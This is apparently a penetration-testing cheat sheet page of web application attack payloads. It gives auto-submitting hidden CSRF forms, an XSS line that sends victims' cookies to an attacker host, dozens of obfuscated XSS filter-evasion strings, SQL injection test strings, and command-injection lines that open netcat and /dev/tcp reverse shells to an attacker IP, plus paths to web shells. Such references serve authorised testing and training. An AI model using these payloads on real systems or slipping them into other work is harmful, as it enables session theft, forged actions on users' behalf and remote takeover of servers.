---
title: Vulnerabilities
category: Web Application
order: 2
---

> **CSRF**

GET:
{% highlight html %}
<img src="http://<ip_of_site>/form.php?<parameter>=<value>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

> **XSS**

Get Cookie:
{% highlight html %}
<script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
{% endhighlight %}

POST:
{% highlight html %}
<form  ID=CSRF action="<website>" method="POST">
<input type="hidden" name="<paramater>" value="<value>"/>
<input type="submit" value="View my pictures" style="position: absolute; left: -9999px; width: 1px; height: 1px;"
       tabindex="-1"/>
</form>
<script>document.getElementById('CSRF').submit();</script>
{% endhighlight %}

> **SQL Injection Test Strings**

{% highlight bash %}
' ` " ; /* --
{% endhighlight %}

> **XSS Test Strings**

{% highlight html %}
'';!--"<XSS>=&{()}
{% endhighlight %}

{% highlight html %}
<script>alert(document.cookie);</script>

<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>

<script src=http://www.example.com/malicious-code.js></script>

%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e

\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e

>"><script>alert("XSS")</script>&

"><STYLE>@import"javascript:alert('XSS')";</STYLE>

>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
 alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>

>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
">
>"

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=javascript:alert('XSS')>

<IMG SRC=JaVaScRiPt:alert('XSS')> 

<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>

<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
 &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>

<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
 &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
           
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
 &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>

<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">

<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">

{% endhighlight %}

> **Blind Command Injection**

{% highlight bash %}
#Attacker Machine
tcpdump -n host <webserver IP> and ICMP
nc -l [port]
#Victim
test; ping -c 4 <yourAttackerIP>; echo hello 
test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
#Alternative to NC for non-debian based distrobutions
/bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
{% endhighlight %}

> **Web Shells**

Kali:
PHP | /usr/share/webshells/php/
PERL | /usr/share/webshells/perl/
Cold Fusion | /usr/share/webshells/cfm/
ASP | /usr/share/webshells/asp/
ASPX | /usr/share/webshells/aspx/
JSP | /usr/share/webshells/jsp/jsp-reverse.jsp

* [PHP and Perl](http://pentestmonkey.net/category/tools/web-shells)
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

> **Useful Resources**

* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [XSS Examples](http://www.xssed.com/)
* [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
* [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
* [SQLMap](http://http/sqlmap.org)

